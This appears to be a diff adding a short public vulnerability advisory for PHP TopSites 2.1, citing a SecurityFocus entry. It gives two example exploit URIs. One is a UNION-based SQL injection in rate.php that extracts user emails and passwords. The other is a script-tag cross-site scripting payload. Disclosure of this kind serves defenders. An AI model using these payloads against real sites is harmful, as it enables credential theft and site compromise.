@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/45389/info
+
+PHP TopSites is prone to a cross-site scripting vulnerability and an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these issues could allow an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+PHP TopSites 2.1 is vulnerable; other versions may also be affected. 
+
+The following example URIs are available:
+
+http://www.example.com/topsites/rate.php?site=-999.9%27%20UNION%20ALL%20SELECT%20%28SELECT%20concat%280x7e,group_concat%28top_user.email,0x7e,top_user.password%29,0x7e%29%20FROM%20%60topfunsites_com_-_topsites%60.top_user%29%20,null%20and%20%27x%27=%27x
+
+http://www.example.com/topsites/rate.php?site="'><script>alert('xss')</script> 
